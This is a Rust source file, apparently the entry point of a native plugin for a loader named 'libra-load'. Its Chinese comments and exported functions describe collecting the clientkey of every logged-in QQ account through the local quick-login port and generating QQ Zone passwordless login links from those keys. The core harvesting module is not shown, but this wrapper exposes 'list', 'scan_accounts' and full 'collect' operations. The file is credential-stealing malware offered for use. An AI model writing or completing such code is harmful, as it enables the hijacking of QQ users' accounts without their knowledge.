//! QQ clientkey 插件 — 独立 native 插件（cdylib）。
//!
//! 完全对齐 qq_ck_test.py 脚本方法：本地快速登录端口取全部已登录 QQ，
//! 每个 uin 取 clientkey，并生成 QQ 空间免登链接（ptsigx）。不做内存扫描/skey/bkn。
//!
//! ABI（libra-load）：
//!   module_name() -> *const u8
//!   module_main(input, input_len, output, output_cap) -> usize

mod qq_clientkey;

/// 自识别名（必须与插件 meta.json 的 module.name 一致）。
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("qqkey", "\0").as_ptr() as *const u8
}

/// 入口：input 为 JSON，op=="list" 时只列账号（uin+nickname，不取 clientkey），
/// 否则执行完整采集（clientkey + ptsigx）。
#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };

    let op = serde_json::from_str::<serde_json::Value>(&input_json)
        .ok()
        .and_then(|v| v.get("op").and_then(|o| o.as_str()).map(String::from))
        .unwrap_or_default();

    let result = if op == "scan_accounts" {
        run_async(qq_clientkey::QQClientKey::scan_accounts())
    } else if op == "list" {
        run_async(qq_clientkey::QQClientKey::list())
    } else {
        run_async(qq_clientkey::QQClientKey::collect())
    };
    write_output(&result, output, output_cap)
}

fn run_async<F: std::future::Future<Output = String>>(f: F) -> String {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map(|rt| rt.block_on(f))
        .unwrap_or_else(|e| format!(r#"{{"error":"runtime: {}"}}"#, e))
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe { std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n); }
    }
    n
}
